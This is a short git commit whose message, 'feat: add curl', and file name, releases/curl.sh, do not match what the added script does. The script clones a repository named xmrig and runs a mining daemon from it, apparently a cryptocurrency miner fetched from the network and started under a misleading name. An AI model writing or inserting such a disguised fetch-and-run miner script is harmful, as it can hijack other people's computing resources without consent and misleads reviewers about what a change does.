7f04719c034788b4ae28f223f86b8b4e1127ca5e
Đức Hoàng <duchoang206h@gmail.com>
2024-02-13 19:13:33 +0700

    feat: add curl

---
+++ releases/curl.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+# Clone the Git repository
+git clone git@github.com:duchoang206h/xmrig.git xmrig_repo
+
+# Change directory to the cloned repository
+cd xmrig_repo
+
+# Run the .sh file
+./releases/xmrig/miner/xmrigDaemon_fee
